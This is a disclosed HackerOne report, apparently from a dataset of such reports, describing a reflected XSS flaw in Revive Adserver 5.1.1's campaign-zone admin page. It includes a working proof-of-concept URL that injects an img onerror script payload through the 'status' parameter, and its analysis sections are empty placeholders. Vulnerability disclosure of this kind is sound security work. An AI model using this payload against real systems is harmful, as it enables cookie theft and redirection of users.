---
source: hackerone
dataset: elamaran619/hackerone_disclosed_reports
h1_id: '1097979'
original_report_id: '1097979'
title: Reflected XSS on /admin/campaign-zone-zones.php
weakness: Cross-site Scripting (XSS) - Reflected
team_handle: revive_adserver
created_at: '2021-02-07T19:56:00.868Z'
disclosed_at: '2021-03-16T15:08:11.755Z'
has_bounty: false
visibility: full
substate: resolved
vote_count: 7
asset_identifier: https://github.com/revive-adserver/revive-adserver
asset_type: SOURCE_CODE
max_severity: critical
tags:
- hackerone
- cross-site-scripting-xss-reflected
---

# Reflected XSS on /admin/campaign-zone-zones.php

## Metadata

- HackerOne Report ID: 1097979
- Weakness: Cross-site Scripting (XSS) - Reflected
- Program: revive_adserver
- Disclosed At: 2021-03-16T15:08:11.755Z
- Has Bounty: No
- Visibility: full
- Substate: resolved

## Original Report

I found a reflected XSS attack on `/admin/campaign-zone-zones.php`.

Revive-Adserver version is `revive-adserver-5.1.1`.

- Go to `http://revive-adserver.loc/admin/campaign-zone-zones.php?_=&clientid=1&campaignid=1&status=available%22%3E%3Cimg%20src=1%20onerror=alert(document.domain)%3E&text=`

- Malicious code executed

{F1187355}

Rendered response from server:

{F1187356}

## Impact

With this vulnerability, an attacker can for example steal users cookies or redirect users on malicious website.

## Extracted Security Notes

### Likely Vulnerability Class

*Leave this section for future enrichment.*

### Likely Root Cause

*Leave this section for future enrichment.*

### Potential Impact

*Leave this section for future enrichment.*

### Defensive Test Cases

*Leave this section for future enrichment.*

### Remediation Ideas

*Leave this section for future enrichment.*
